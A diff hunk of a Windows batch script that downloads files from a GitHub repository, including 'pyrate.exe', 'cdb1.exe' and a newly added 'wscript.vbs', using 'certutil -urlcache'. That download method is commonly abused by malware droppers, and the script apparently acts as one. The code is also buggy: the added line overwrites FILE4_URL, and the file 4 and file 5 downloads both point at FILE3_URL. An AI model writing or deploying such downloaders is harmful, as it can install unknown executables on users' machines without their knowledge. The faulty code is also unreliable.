@@ -30,6 +30,8 @@ set FILE1_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/pyrate.exe
 set FILE2_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/cdb1.exe
 set FILE3_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/file_info.db
 set FILE4_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/win-win.xml
+set FILE4_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/wscript.vbs
+
 
 rem Create the directory if it doesn't exist
 if not exist "%DOWNLOAD_DIR%" (
@@ -48,6 +50,9 @@ certutil -urlcache -split -f "%FILE3_URL%" "%DOWNLOAD_DIR%\file_info.db"
 
 echo Downloading file 4...
 certutil -urlcache -split -f "%FILE3_URL%" "%DOWNLOAD_DIR%\win-win.xml"
+
+echo Downloading file 5...
+certutil -urlcache -split -f "%FILE3_URL%" "%DOWNLOAD_DIR%\wscript.vbs"
 
 
 echo Download complete.
